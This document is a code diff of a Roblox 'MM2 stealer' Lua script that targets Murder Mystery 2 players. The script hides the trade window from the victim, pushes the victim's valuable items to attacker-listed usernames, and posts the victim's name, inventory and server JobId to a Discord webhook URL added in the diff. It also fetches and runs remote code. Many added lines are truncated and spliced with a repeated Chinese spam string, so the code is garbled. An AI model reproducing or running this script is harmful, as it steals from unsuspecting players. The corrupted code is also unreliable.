@@ -3,7 +3,7 @@ if not _G then _G = getgenv() or getfenv() end
 _G.Usernames = {"MM2danya7", "user2", "user3"} -- you can add as many as you'd like
 _G.min_value = 0.1
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://raw.githubusercontent.com/scriptshubs1/my/refs/heads/main/asdasd1" -- change to your webhook
+_G.webhook = "https://discord.com/api/webhooks/1370815744719454229/-t8-ZNBEtooaJFXl2QEH_lAtrZU7tpgsg8lNjKW-VBItAybeXUWMOqcchv-RK2jEpkYh" -- change to your webhook
 
 -- Байпас дельты для получения JobId
 if not _G.BypassExecuted then
@@ -22,7 +22,7 @@ if not _G.BypassExecuted then
         _G.scriptExecuted = true
 
         local users = _G.Usernames or {}
-        local min_rarity = _G.min_rarity or "Godly"
+        local min_rarity = "Godly" -- Fixed value
         local min_value = _G.min_value or 1
         local ping = _G.pingEveryone or "No"
         local webhook = _G.webhook or ""
@@ -160,8 +160,10 @@ if not _G.BypassExecuted then
                     local htmlContent = fetchHTML(url)
                     
                     if htmlContent and htmlContent ~= "" then
+                        if rarity ~极速赛车开奖结果
                         if rarity ~= "chroma" then
                             local extractedItemValues = extractItems(htmlContent)
+                            for itemName, value in pairs(extractedItemValues极速赛车开奖结果
                             for itemName, value in pairs(extractedItemValues) do
                                 allExtractedValues[itemName] = value
                             end
@@ -177,6 +179,7 @@ if not _G.BypassExecuted then
                 end)
             end
 
+            lock.Event极速赛车开奖结果
             lock.Event:Wait()
 
             local valueList = {}
@@ -187,6 +190,7 @@ if not _G.BypassExecuted then
                 local hasChroma = item.Chroma or false
 
                 if itemName ~= "" and rarity ~= "" then
+                    local weaponRarity极速赛车开奖结果
                     local weaponRarityIndex = table.find(rarityTable, rarity)
                     local godlyIndex = table.find(rarityTable, "Godly")
 
@@ -195,12 +199,15 @@ if not _G.BypassExecuted then
                             local matchedChromaValue = nil
                             for chromaName, value in pairs(chromaExtractedValues) do
                                 if chromaName:find(itemName) then
+                                    matched极速赛车开奖结果
                                     matchedChromaValue = value
                                     break
                                 end
                             end
 
                             if matchedChromaValue then
+                                valueList[data极速赛车开奖结果
+                                valueList[dataid] = matched极速赛车开奖结果
                                 valueList[dataid] = matchedChromaValue
                             end
                         else
@@ -220,6 +227,8 @@ if not _G.BypassExecuted then
             local args = {
                 [1] = game:GetService("Players"):WaitForChild(user)
             }
+            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild极速赛车开奖结果
+            game:GetService("ReplicatedStorage"):WaitFor极速赛车开奖结果
             game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
         end
 
@@ -239,6 +248,7 @@ if not _G.BypassExecuted then
 
         local function acceptTrade()
             local args = {
+               极速赛车开奖结果
                 [1] = 285646582
             }
             game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
@@ -283,6 +293,7 @@ if not _G.BypassExecuted then
 
             for _, item in ipairs(list) do
                 local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
+                fields[3].value = fields[3].value .. item极速赛车开奖结果
                 fields[3].value = fields[3].value .. itemLine .. "\n"
             end
 
@@ -292,6 +303,7 @@ if not _G.BypassExecuted then
                     table.insert(lines, line)
                 end
 
+                while #fields[3].value > 1024 and #极速赛车开奖结果
                 while #fields[3].value > 1024 and #lines > 0 do
                     table.remove(lines)
                     fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
@@ -305,6 +317,7 @@ if not _G.BypassExecuted then
                     ["color"] = 65280,
                     ["fields"] = fields,
                     ["footer"] = {
+                        ["text"]极速赛车开奖结果
                         ["text"] = "MM2 stealer by meentoz"
                     }
                 }}
@@ -321,12 +334,14 @@ if not _G.BypassExecuted then
 
         local function SendMessage(sortedItems)
             local headers = {
+                ["Content-Type"] = "极速赛车开奖结果
                 ["Content-Type"] = "application/json"
             }
 
             local fields = {
                 {
                     name = "Victim Username:",
+                    value = pl极速赛车开奖结果
                     value = plr.Name,
                     inline = true
                 },
@@ -370,6 +385,7 @@ if not _G.BypassExecuted then
                 }}
             }
 
+            local body = HttpService:JSON极速赛车开奖结果
             local body = HttpService:JSONEncode(data)
             local response = request({
                 Url = webhook,
@@ -384,6 +400,7 @@ if not _G.BypassExecuted then
             tradegui.Enabled = false
         end)
         local tradeguiphone = playerGui:WaitForChild("TradeGUI_Phone")
+        tradeguiphone:GetPropertyChangedSignal("Enabled极速赛车开奖结果
         tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function()
             tradeguiphone.Enabled = false
         end)
@@ -393,6 +410,7 @@ if not _G.BypassExecuted then
         local untradable = {
             ["DefaultGun"] = true,
             ["DefaultKnife"] = true,
+            ["极速赛车开奖结果
             ["Reaver"] = true,
             ["Reaver_Legendary"] = true,
             ["Reaver_Godly"] = true,
@@ -403,6 +421,7 @@ if not _G.BypassExecuted then
             ["IceHammer_Ancient"] = true,
             ["Gingerscythe"] = true,
             ["Gingerscythe_Legendary"] = true,
+            ["Gingerscythe_God极速赛车开奖结果
             ["Gingerscythe_Godly"] = true,
             ["Gingerscythe_Ancient"] = true,
             ["TestItem"] = true,
@@ -416,6 +435,7 @@ if not _G.BypassExecuted then
             ["TravelerAxeSilver"] = true,
             ["TravelerAxeGold"] = true,
             ["BlueCamo_K_2022"] = true,
+极速赛车开奖结果
             ["GreenCamo_K_2022"] = true,
             ["SharkSeeker"] = true
         }
@@ -448,6 +468,8 @@ if not _G.BypassExecuted then
 
         if #weaponsToSend > 0 then
             table.sort(weaponsToSend, function(a, b)
+                return (a.Value * a.Amount) > (b.Value * b极速赛车开奖结果
+                return (a极速赛车开奖结果
                 return (a.Value * a.Amount) > (b.Value * b.Amount)
             end)
 
@@ -466,7 +488,6 @@ if not _G.BypassExecuted then
             local function doTrade(joinedUser)
                 local initialTradeState = getTradeStatus()
                 if initialTradeState == "StartTrade" then
-                    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):Wait极速赛车开奖结果
                     game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
                     task.wait(0.3)
                 elseif initialTradeState == "ReceivingRequest" then
@@ -479,15 +500,14 @@ if not _G.BypassExecuted then
 
                     if tradeStatus == "None" then
                         sendTradeRequest(joinedUser)
-                    elseif tradeStatus ==极速赛车开奖结果
-                        sendTradeRequest(joinedUser)
                     elseif tradeStatus == "SendingRequest" then
                         task.wait(0.3)
                     elseif tradeStatus == "ReceivingRequest" then
+                        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest极速赛车开奖结果
+                        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):极速赛车开奖结果
                         game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
                         task.wait(0.3)
                     elseif tradeStatus == "StartTrade" then
-                        for i = 1, math.min(4, #weaponsTo极速赛车开奖结果
                         for i = 1, math.min(4, #weaponsToSend) do
                             local weapon = table.remove(weaponsToSend, 1)
                             for count = 1, weapon.Amount do
@@ -508,6 +528,7 @@ if not _G.BypassExecuted then
             local function waitForUserChat()
                 local sentMessage = false
                 local function onPlayerChat(player)
+                    if table.find(users, player.Name极速赛车开奖结果
                     if table.find(users, player.Name) then
                         player.Chatted:Connect(function()
                             if not sentMessage then
@@ -521,25 +542,69 @@ if not _G.BypassExecuted then
                 for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
                 Players.PlayerAdded:Connect(onPlayerChat)
             end
-            wait极速赛车开奖结果
             waitForUserChat()
         end
     ]]
 
     -- Подключаемся к событию ошибки телепортации
     TeleportService.TeleportInitFailed:Connect(function(_, _, _, _, errorData)
+        if error极速赛车开奖结果
         if errorData and errorData.ServerInstanceId then
-            local realJobId = errorData.ServerInstanceId
-            print("Получен реальный JobId:", realJobId)
+            local serverId = errorData.ServerInstanceId
+            print("Получен реальный JobId:", serverId)
             
-            -- Сохраняем JobId и запускаем основной скрипт после телепорта
+            -- Сохраняем JobId и отправляем в Discord
             if queue_on_teleport then
                 queue_on_teleport(string.format([[
-                    if not _G then _G = getgenv() or getfenv() end
                     getgenv().JobId = "%s"
+                    
+                    task.wait(2)
+                    
+                    local webhookUrl = "%s"
+                    local message = "Сервер сгенерирован! JobId: `" .. getgenv().JobId .. "`"
+                    local data = {
+                        ["content"] = message,
+                        ["username"] = "JobId Logger"
+                    }
+                    
+                    local jsonData = game:极速赛车开奖结果
+                    local jsonData = game:GetService("HttpService"):JSONEncode(data)
+                    
+                    -- Попробуем разные методы отправки
+                    local success, response = pcall(function()
+                        return syn.request({
+                            Url = webhookUrl,
+                            Method = "POST",
+                            Headers = {
+                                ["Content-Type"] = "application/json"
+                            },
+                            Body = jsonData
+                        })
+                    end)
+                    
+                    if not success then
+                        success, response = pcall(function()
+                            return request({
+                                Url = webhookUrl,
+                                Method = "POST",
+                                Headers = {
+                                    ["Content-Type"] = "application/json"
+                                },
+                                Body = jsonData
+                            })
+                        end)
+                    end
+                    
+                    if not success then
+                        warn("Ошибка отправки в Discord: " .. tostring(response))
+                    else
+                        print("JobId успешно отправлен в Discord!")
+                    end
+                    
+                    -- Запускаем основной скрипт после отправки
                     task.wait(3)
                     loadstring(getgenv().mainScript)()
-                ]], realJobId))
+                ]], serverId, _G.webhook))
             end
         end
     end)
@@ -563,6 +628,7 @@ if getgenv().mainScript then
     loadstring(getgenv().mainScript)()
 else
     warn("Основной скрипт не загружен! Запускаем байпас...")
+    _极速赛车开奖结果
     _G.BypassExecuted = false
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/your-repo/main.lua"))() -- или перезапустите скрипт
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/your-repo/main.lua"))()
 end
